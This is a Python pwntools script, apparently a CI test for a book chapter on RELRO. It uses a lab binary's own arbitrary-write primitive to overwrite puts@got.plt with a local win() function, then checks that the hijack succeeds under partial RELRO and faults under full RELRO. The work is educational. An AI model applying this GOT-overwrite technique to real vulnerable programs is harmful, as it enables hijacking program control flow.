#!/usr/bin/env python3
"""ch11-canary/relro/solve.py -- point puts@got.plt at win() using the
program's own arbitrary-write primitive. Succeeds against relro_partial;
segfaults on the write instruction against relro_full.

The chapter's version resolves system@libc and points puts@got.plt at it;
the CI target uses a local win() so the "shell popped" oracle is a marker
file rather than a live /bin/sh interaction. The RELRO lesson is identical
either way: partial writes go through, full ones fault.
"""
import os
import sys

from pwn import ELF, context, log, process

context.log_level = "warning"


def try_write(binary: str):
    """Return (marker_written: bool, exit_signal: int|None, exit_code: int|None)."""
    here = os.path.dirname(os.path.abspath(binary))
    marker = os.path.join(here, "pwn.marker")
    try:
        os.remove(marker)
    except FileNotFoundError:
        pass

    elf = ELF(binary, checksec=False)
    puts_got = elf.got["puts"]
    win_addr = elf.sym["win"]

    io = process([binary], cwd=here)
    io.recvline()  # 'ready'
    io.sendline(f"{puts_got:x} {win_addr:x}".encode())
    try:
        io.recvall(timeout=3)
    except Exception:
        pass
    io.wait(timeout=5)
    sig  = None
    code = io.poll()
    if code is not None and code < 0:
        sig, code = -code, None
    io.close()
    return os.path.exists(marker), sig, code


def main() -> int:
    if len(sys.argv) != 3 or sys.argv[1] not in ("partial", "full"):
        print("usage: solve.py {partial|full} <binary>", file=sys.stderr)
        return 2
    mode, binary = sys.argv[1], sys.argv[2]
    log.info(f"target: {binary} (expect: {mode})")

    marker, sig, code = try_write(binary)
    log.info(f"marker={marker} sig={sig} code={code}")

    if mode == "partial":
        if marker:
            print("RELRO-PARTIAL-OK: puts@got hijack succeeded")
            return 0
        print(f"RELRO-PARTIAL-FAIL: marker not written (sig={sig}, code={code})")
        return 1
    else:  # full
        if not marker and sig in (11, 7):  # SIGSEGV or SIGBUS on the write
            print(f"RELRO-FULL-OK: write faulted as expected (sig={sig})")
            return 0
        if marker:
            print("RELRO-FULL-FAIL: hijack unexpectedly succeeded under full RELRO")
            return 1
        print(f"RELRO-FULL-FAIL: unexpected exit (sig={sig}, code={code})")
        return 1


if __name__ == "__main__":
    sys.exit(main())
